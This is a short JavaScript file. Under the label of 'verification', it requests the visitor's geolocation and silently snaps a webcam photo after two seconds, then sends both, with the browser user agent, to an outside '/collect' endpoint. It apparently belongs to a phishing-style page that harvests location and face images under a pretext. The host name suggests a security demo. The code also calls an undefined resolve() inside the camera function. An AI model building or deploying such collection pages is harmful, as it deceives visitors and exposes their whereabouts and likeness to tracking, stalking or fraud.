async function startVerification() {
  await getLocation();
  await capturePhoto();
}

/* 📍 Location */
function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      alert("Geolocation not supported");
      resolve();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendData({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        });
        resolve();
      },
      () => resolve()
    );
  });
}

/* 📷 Camera */
async function capturePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    video.srcObject = stream;
    await video.play();

    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");

      sendData({ image: imageData });

      stream.getTracks().forEach(track => track.stop());
      resolve();
    }, 2000);

  } catch (err) {
    console.log("Camera permission denied", err);
    resolve();
  }
}

/* 📤 Send Data */
async function sendData(data) {
  try {
    const res = await fetch(
      "https://cyber-security-protos.onrender.com/collect",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...data,
          userAgent: navigator.userAgent,
          time: new Date().toISOString(),
        }),
      }
    );

    const result = await res.json();
    console.log("Server response:", result);
  } catch (err) {
    console.log("Send failed:", err);
  }
}
